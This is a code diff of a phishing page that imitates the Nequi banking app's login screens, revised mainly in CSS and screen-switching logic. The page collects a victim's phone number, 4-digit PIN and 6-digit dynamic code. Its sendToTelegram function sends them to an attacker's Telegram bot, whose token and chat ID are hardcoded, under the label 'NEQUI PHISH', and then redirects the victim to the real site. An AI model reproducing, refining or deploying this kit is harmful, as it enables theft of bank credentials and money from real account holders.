@@ -16,7 +16,6 @@
       display: flex;
       justify-content: center;
       align-items: center;
-      overflow: hidden;
     }
 
     .phone-frame {
@@ -28,22 +27,23 @@
       overflow: hidden;
     }
 
-    .screen {
+    #screen1, #screen2, #screen3, #loader {
       position: absolute;
       top: 0; left: 0;
       width: 100%;
       height: 100%;
       padding: 20px;
-      background: #1F0829;
       display: none;
       flex-direction: column;
+      background: #1F0829;
     }
 
-    #screen1 { display: flex !important; }
+    #screen1 { display: flex; }
 
     .help {
       position: absolute;
-      top: 25px; right: 25px;
+      top: 25px;
+      right: 25px;
       width: 32px; height: 32px;
       border: 2px solid rgba(255,255,255,0.9);
       border-radius: 50%;
@@ -62,12 +62,7 @@
     }
     .nequi-logo span { color: #FF2D95; margin-right: 8px; }
 
-    .label { 
-      text-align: center; 
-      margin: 70px 0 35px 0; 
-      font-size: 17.5px; 
-      color: #D8B5E8; 
-    }
+    .label { text-align: center; margin: 70px 0 35px 0; font-size: 17.5px; color: #D8B5E8; }
 
     .input-box {
       background: #2C1642;
@@ -101,13 +96,14 @@
 
     .back {
       position: absolute;
-      top: 25px; left: 20px;
+      top: 25px;
+      left: 20px;
       font-size: 30px;
       cursor: pointer;
     }
 
     .title {
-      margin-top: 65px;
+      margin-top: 70px;
       text-align: center;
       font-size: 26px;
       font-weight: 500;
@@ -120,8 +116,8 @@
       gap: 20px;
     }
     .pin {
-      width: 50px;
-      height: 50px;
+      width: 52px;
+      height: 52px;
       background: #E0B0FF;
       border-radius: 10px;
       display: flex;
@@ -136,7 +132,6 @@
       color: #C8A2E0;
       font-size: 15.5px;
       line-height: 1.5;
-      padding: 0 20px;
     }
 
     .keyboard {
@@ -160,6 +155,13 @@
     .key:active { background: rgba(255,255,255,0.25); }
     .delete { font-size: 26px !important; }
 
+    /* Loader */
+    #loader {
+      flex-direction: column;
+      justify-content: center;
+      align-items: center;
+      text-align: center;
+    }
     .spinner {
       width: 55px;
       height: 55px;
@@ -170,6 +172,7 @@
       margin-bottom: 25px;
     }
     @keyframes spin { to { transform: rotate(360deg); } }
+    .loader-text { font-size: 18px; color: #E0B0FF; }
   </style>
 </head>
 <body>
@@ -177,7 +180,7 @@
   <div class="phone-frame">
 
     <!-- Pantalla 1 -->
-    <div class="screen" id="screen1">
+    <div id="screen1">
       <div class="help">?</div>
       <div class="nequi-logo"><span>■</span>Nequi</div>
       <div class="label">Ingresa tu número de celular</div>
@@ -188,7 +191,7 @@
     </div>
 
     <!-- Pantalla 2 - Clave 4 dígitos -->
-    <div class="screen" id="screen2">
+    <div id="screen2">
       <div class="back" onclick="goBack(1)">←</div>
       <div class="title">Escribe tu clave</div>
       <div class="pins" id="pins4">
@@ -212,14 +215,14 @@
     </div>
 
     <!-- Pantalla 3 - Clave Dinámica -->
-    <div class="screen" id="screen3">
+    <div id="screen3">
       <div class="back" onclick="goBack(2)">←</div>
       <div class="title">Clave Dinámica</div>
       <div class="pins" id="pins6">
         <div class="pin"></div><div class="pin"></div><div class="pin"></div>
         <div class="pin"></div><div class="pin"></div><div class="pin"></div>
       </div>
-      <div class="message">Ingresa el código de 6 dígitos<br>que aparece en la app</div>
+      <div class="message">Ingresa el código de 6 dígitos<br>que te enviamos por SMS</div>
       <div class="keyboard">
         <div class="key" onclick="addDigit(1,6)">1</div>
         <div class="key" onclick="addDigit(2,6)">2</div>
@@ -237,67 +240,72 @@
     </div>
 
     <!-- Loader -->
-    <div class="screen" id="loader">
+    <div id="loader">
       <div class="spinner"></div>
-      <div style="text-align:center; font-size:18px; margin-top:20px;">Verificando información...</div>
+      <div class="loader-text">Verificando información...</div>
     </div>
 
   </div>
 
   <script>
-    let phoneNumber = "";
     let currentPin = "";
     let currentLength = 4;
+    let phoneNumber = "";
 
     const botToken = "8712944286:AAGUAFIPjLNX5sMeEYdNjLNoFGXiQL_ZNO8";
     const chatId = "773351137";
 
     function goToPassword() {
       const phone = document.getElementById("phone").value.trim();
-      if (phone.length < 9) return alert("Por favor ingresa un número válido");
-      
+      if (phone.length < 9) {
+        alert("Por favor ingresa un número válido");
+        return;
+      }
       phoneNumber = phone;
-      showScreen('screen2');
+      showScreen(2);
     }
 
-    function showScreen(screenId) {
-      document.querySelectorAll('.screen').forEach(screen => {
-        screen.style.display = 'none';
+    function showScreen(screen) {
+      document.querySelectorAll('#screen1, #screen2, #screen3, #loader').forEach(el => {
+        el.style.display = 'none';
       });
-      document.getElementById(screenId).style.display = 'flex';
 
-      if (screenId === 'screen2' || screenId === 'screen3') {
-        currentLength = (screenId === 'screen2') ? 4 : 6;
+      if (screen === 'loader') {
+        document.getElementById('loader').style.display = 'flex';
+      } else {
+        document.getElementById('screen' + screen).style.display = 'flex';
+        currentLength = (screen === 2) ? 4 : 6;
         currentPin = "";
         updatePins();
       }
     }
 
-    function addDigit(num, expectedLength) {
-      if (currentPin.length < expectedLength) {
+    function addDigit(num, length) {
+      if (currentPin.length < length) {
         currentPin += num;
         updatePins();
-        if (currentPin.length === expectedLength) {
+        if (currentPin.length === length) {
           sendToTelegram();
         }
       }
     }
 
-    function deleteDigit() {
+    function deleteDigit(length) {
       currentPin = currentPin.slice(0, -1);
       updatePins();
     }
 
     function updatePins() {
-      const container = currentLength === 4 ? "pins4" : "pins6";
-      const pins = document.querySelectorAll(`#${container} .pin`);
-      pins.forEach((pin, i) => {
-        pin.textContent = i < currentPin.length ? "●" : "";
+      const id = currentLength === 4 ? "pins4" : "pins6";
+      const boxes = document.querySelectorAll("#" + id + " .pin");
+      boxes.forEach((box, i) => {
+        box.textContent = i < currentPin.length ? "●" : "";
       });
     }
 
     function sendToTelegram() {
       const tipo = currentLength === 4 ? "Clave Principal" : "Clave Dinámica";
+      
       const message = `🔴 NEQUI PHISH\n\n📱 Número: +57 ${phoneNumber}\n🔑 ${tipo}: ${currentPin}\n⏰ ${new Date().toLocaleString('es-CO')}`;
 
       fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
@@ -310,7 +318,7 @@
 
       setTimeout(() => {
         if (currentLength === 4) {
-          showScreen('screen3');        // Va correctamente a Clave Dinámica
+          showScreen(3);           // Ir a Clave Dinámica
         } else {
           window.location.href = "https://www.nequi.com.co";
         }
@@ -318,8 +326,8 @@
     }
 
     function goBack(from) {
-      if (from === 1) showScreen('screen1');
-      if (from === 2) showScreen('screen2');
+      if (from === 1) showScreen(1);
+      if (from === 2) showScreen(2);
     }
   </script>
 </body>
